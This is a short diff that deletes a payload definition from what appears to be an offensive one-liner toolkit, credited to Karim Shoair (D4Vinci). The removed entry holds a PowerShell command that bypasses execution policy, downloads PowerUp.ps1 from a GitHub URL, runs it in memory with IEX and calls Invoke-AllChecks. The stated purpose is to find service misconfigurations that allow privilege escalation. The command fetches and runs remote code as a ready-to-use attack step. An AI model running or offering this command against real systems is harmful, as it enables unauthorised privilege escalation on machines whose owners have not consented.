@@ -1,7 +1,0 @@
-[Info]
-Author      = Karim shoair (D4Vinci)
-Description = Search for vulnerable service privilege opportunities using script from PowerTools
-
-[Payload]
-Type     = Other
-Payload  = Powershell.exe -exec bypass IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/cheetz/PowerTools/master/PowerUp/PowerUp.ps1'); Invoke-AllChecks
